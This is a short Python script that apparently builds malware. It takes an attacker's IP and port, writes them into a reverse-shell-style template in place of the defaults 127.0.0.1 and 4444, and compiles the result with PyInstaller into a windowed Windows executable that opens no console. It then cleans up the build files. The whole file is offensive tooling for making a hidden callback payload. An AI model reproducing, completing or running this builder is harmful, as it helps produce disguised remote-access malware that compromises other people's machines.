import argparse
from shutil import rmtree
from os import system, path, remove, rename, getcwd

def move_file(source: str, destination: str):
    try:
        rename(source, destination)
         #print(f"File moved from {source} to {destination}")
    except FileNotFoundError:
        print(f"Source file {source} not found")
    except Exception as e:
        print(f"Error moving file: {e}")

def generateAndCompile(addr:str, port:int, filename:str):
    with open("template.py", "r") as file:
        payload = file.read().replace("127.0.0.1", addr).replace("4444", str(port))

    with open(filename, "w") as g:
        g.write(payload)

    print("Compiling...")
    system(f'pyinstaller --noconfirm --onefile --windowed "{filename}"') #--console
    print("Done Compiling!")
    print("Removing temporary files...")
    filename_without_extension = "".join(filename.split(".")[:-1] if len(filename.split(".")) > 1 else filename) 

    if path.exists(filename_without_extension+".spec"):
        remove(filename_without_extension+".spec")

    if path.exists("build"):
        rmtree("build")
    
    filename = path.join("dist", filename_without_extension+".exe")
    if path.exists(filename):
        move_file(filename, getcwd()+f"\\{filename_without_extension}.exe")

    rmtree("dist")
    print("Done removing temporary files!")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-H", "--host",     type=str, required=True, help="IP")
    parser.add_argument("-P", "--port",     type=int, required=True, help="PORT")
    parser.add_argument("-F", "--filename", type=str, required=True, help="PAYLOAD FILENAME")
    args = parser.parse_args()
    host = args.host
    port = args.port
    filename = args.filename
    generateAndCompile(host, port, filename)
